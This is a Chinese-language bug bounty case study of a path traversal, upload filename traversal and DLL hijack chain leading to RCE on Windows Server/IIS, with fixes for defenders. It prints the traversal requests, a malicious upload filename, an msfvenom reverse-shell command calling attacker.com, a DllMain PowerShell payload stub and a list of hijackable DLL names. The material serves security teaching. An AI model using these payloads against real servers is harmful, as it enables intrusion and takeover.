# 案例 003：路径遍历 → DLL劫持 → RCE（$111k）

> **来源**: 基于公开的HackerOne/Synack漏洞报告改写，涉及Windows Server+IIS场景。
> **赏金**: $111,000（约80万人民币），为Synack Red Team顶级赏金之一。
>
> **法律声明**: 本文仅用于安全技术教学。漏洞发现后已通过正规渠道上报并修复。未经授权复现此攻击属于违法行为。

---

## 概述

| 项目 | 内容 |
|------|------|
| 漏洞类型 | 路径遍历 → DLL劫持 → 远程代码执行 |
| 赏金额度 | $111,000 |
| 攻击路径 | 文件读取 → 发现可写目录 → DLL上传劫持 → RCE |
| 目标架构 | Windows Server + IIS |
| 关键思路 | 路径遍历别只读，想想能写什么到哪 |

---

## 一、初始发现

### 1.1 入口：路径遍历

目标是一个大型企业的Web应用，在文件下载功能中发现路径遍历：

```http
GET /download?file=report_2024_01.pdf HTTP/1.1
Host: app.target.com
```

测试者尝试路径遍历：

```http
GET /download?file=../../../etc/passwd HTTP/1.1
```

返回 `500`，显然在Windows上。

```http
GET /download?file=..\..\..\windows\win.ini HTTP/1.1
```

**返回200**，包含 `win.ini` 文件内容。

**确认存在路径遍历漏洞。**

### 1.2 文件读取能力确认

```http
GET /download?file=..\..\..\windows\system32\drivers\etc\hosts HTTP/1.1
GET /download?file=..\..\..\inetpub\wwwroot\web.config HTTP/1.1
GET /download?file=..\..\..\inetpub\wwwroot\Global.asax HTTP/1.1
```

成功读取 `web.config` 和 `Global.asax`，获取了应用配置、连接字符串等信息。

---

## 二、深入探测

### 2.1 读取系统信息

测试者进一步读取了系统关键文件：

```http
GET /download?file=..\..\..\windows\system32\inetsrv\config\applicationHost.config HTTP/1.1
GET /download?file=..\..\..\Program Files\IIS Express\config\templates\PersonalWebServer\aspnet.config HTTP/1.1
```

### 2.2 发现可写目录

通过读取IIS配置和应用代码，测试者发现了一个关键信息：

```
Uploads 目录路径: C:\inetpub\wwwroot\uploads\
配置为可写入    ✅
```

并且后续又发现了日志文件中的信息：

```
Log Path: C:\ProgramData\AppLogs\
日志每15分钟刷新一次
```

### 2.3 致命转折

测试者读取了应用的DLL加载列表和应用程序配置，发现：

> 应用启动时会从 `C:\ProgramData\AppLogs\` 目录加载 `loghelper.dll`。

但测试者检查后发现，**这个目录下根本没有这个DLL文件**。

这就意味着——**如果能将任意DLL写入这个目录，应用下次加载时就会加载测试者上传的恶意DLL**。

### 2.4 从"读"到"写"的转变

**核心问题：路径遍历只给了读的能力，如何变成写？**

测试者回顾了下载功能的实现代码（从之前读取的文件中分析）：

```csharp
// 伪代码
string filePath = Path.Combine(baseDir, Request["file"]);
return File.ReadAllBytes(filePath);  // 只有读，没有写
```

**下载功能本身不支持写文件。**

---

## 三、寻找上传点

### 3.1 功能梳理

测试者重新审视了整个应用的功能：

1. 用户头像上传
2. 文件附件上传
3. 批量导入功能
4. 应用截图上传

### 3.2 找到上传功能

在用户个人设置中发现头像上传功能：

```http
POST /api/user/avatar HTTP/1.1
Content-Type: multipart/form-data

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="avatar.jpg"
Content-Type: image/jpeg

[图片二进制数据]
```

### 3.3 确认上传目录可写

上传一张图片后，测试者利用路径遍历来确认文件位置：

```http
GET /download?file=..\..\..\inetpub\wwwroot\uploads\avatar_12345.jpg HTTP/1.1
```

**返回200，确认上传成功且文件可读取。**

---

## 四、DLL劫持

### 4.1 利用路径遍历+上传实现DLL落地

测试者的完整思路：

```
1. 上传文件到 uploads 目录（可控文件名）
2. 但DLL劫持需要文件位于 C:\ProgramData\AppLogs\
3. 路径遍历 + 上传功能不支持任意路径写入
```

**关键发现：Windows下的NTFS符号链接（Junction）或目录穿越**

但测试者发现一个更直接的方式——**检查发现上传功能在保存文件时使用了路径拼接，存在路径穿越**：

```http
POST /api/user/avatar HTTP/1.1
Content-Type: multipart/form-data

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="..\..\..\ProgramData\AppLogs\loghelper.dll"
Content-Type: application/octet-stream

[DLL二进制数据]
```

**文件名中的 `..\..\..\ProgramData\AppLogs\loghelper.dll` 被拼接后直接用于保存文件路径。**

### 4.2 生成恶意DLL

```bash
# 使用msfvenom生成DLL（模拟）
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker.com LPORT=4444 \
  -f dll -o loghelper.dll
```

或者自行编写一个简单的DLL，在DllMain中执行payload：

```c
// loghelper_dll.c (示意)
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule,
                      DWORD  ul_reason_for_call,
                      LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        // 执行反弹Shell
        system("powershell -NoP -NonI -Exec Bypass -Command \"IEX(...)\"");
    }
    return TRUE;
}
```

### 4.3 上传恶意DLL

```bash
curl -X POST https://app.target.com/api/user/avatar \
  -F "file=@loghelper.dll;filename=..\..\..\ProgramData\AppLogs\loghelper.dll"
```

**上传成功，DLL成功写入目标路径。**

### 4.4 触发DLL加载

测试者等待应用的下一次日志刷新（根据之前读取的日志配置，每15分钟触发一次），或者直接触发应用重新加载：

- 某些操作会触发应用重启
- 等待IIS应用程序池自动回收
- 或者通过其他接口触发日志写入

最终，应用加载了 `C:\ProgramData\AppLogs\loghelper.dll`，**恶意DLL被执行，测试者获得了服务器SYSTEM权限**。

---

## 五、利用链全景

```
路径遍历 (/download?file=../../../Windows/win.ini)
        │
        ▼
   读取web.config & Global.asax (了解架构)
        │
        ▼
   发现DLL加载路径漏洞 (缺失loghelper.dll)
        │
        ▼
   N种方案实现DLL写入
   ├─ 上传功能文件名路径穿越
   ├─ 任意文件写入接口
   └─ 利用文件上传+路径遍历组合
        │
        ▼
   上传恶意DLL到目标加载路径
        │
        ▼
   触发DLL加载 (IIS重启/定时任务/主动触发)
        │
        ▼
   SYSTEM权限RCE
        │
        ▼
   $111,000 Bounty
```

---

## 六、漏洞根因分析

| 问题 | 说明 |
|------|------|
| 路径遍历 | 文件下载未对路径做规范化检查 |
| 上传过滤不严 | 文件名未过滤 `../` 导致任意路径写入 |
| DLL缺失 | 日志模块引用的DLL在路径中不存在 |
| 文件权限过大 | IUSR/IIS_IUSRS对 `C:\ProgramData\AppLogs\` 有写入权限 |
| 高权限运行 | IIS应用程序池以高权限账户运行 |

---

## 七、关键教训

### 对白帽子

1. **路径遍历不只有"读"** —— 配合上传功能就能变成"写"
2. **DLL劫持 = Windows下的大杀器** —— 寻找缺失的DLL，利用任意写实现RCE
3. **组合漏洞 > 单一漏洞** —— 路径遍历+文件上传 = RCE 的组合价值远超单个漏洞
4. **了解目标技术栈** —— Windows + IIS + .NET 的组合意味着DLL劫持成功率极高
5. **寻找"缺失的组件"** —— 应用引用了某个不存在的文件/组件，这就是你的机会
6. **读取的每一行配置都有价值** —— web.config中的DLL路径、连接字符串、日志配置等等

### 对防御方

1. **路径规范化** —— `System.IO.Path.GetFullPath()` 检查路径是否在允许范围内
2. **上传文件名校验** —— 过滤 `../` `..\` 等路径穿越字符，不要信任用户输入的文件名
3. **最小文件权限** —— Web应用用户对ProgramData等目录不应有写入权限
4. **移除不必要依赖** —— 项目中不要引用不存在的DLL，用不到的DLL删掉
5. **定期检查DLL加载** —— 使用Process Monitor监控异常DLL加载行为
6. **文件上传保存路径应严格控制** —— 使用GUID重命名，不要使用用户提供的文件名

---

## 八、Windows DLL劫持常见目录

> 在Windows审计中，以下目录存在DLL劫持风险：

| 目录 | 说明 |
|------|------|
| 应用程序当前目录 | 先于系统目录搜索DLL |
| `C:\Windows\System32\` | 需要管理员权限写 |
| `C:\ProgramData\` | 常见低权限用户可写 |
| `C:\Windows\Temp\` | 经常可写 |
| `%USERPROFILE%\AppData\` | 用户目录 |
| 程序安装目录的子目录 | 如 `C:\Program Files\AppName\Plugins\` |

### 经典DLL劫持名称

| DLL名 | 说明 |
|-------|------|
| `wlbsctrl.dll` | IIS加载 |
| `dbghelp.dll` | 调试工具 |
| `version.dll` | 系统版本查询（最常见易劫持）|
| `winrnr.dll` | Windows网络解析 |
| `loghelper.dll` | 自定义日志组件 |
| `NppShell.dll` | 自定义Shell扩展 |
| `wlbsctrl.dll` | 网络负载均衡 |

---

> **心法**: 路径遍历的终点不是 `/etc/passwd`，而是发现"什么东西缺失了"。系统中每一个缺失的组件，都是通往RCE的阶梯。
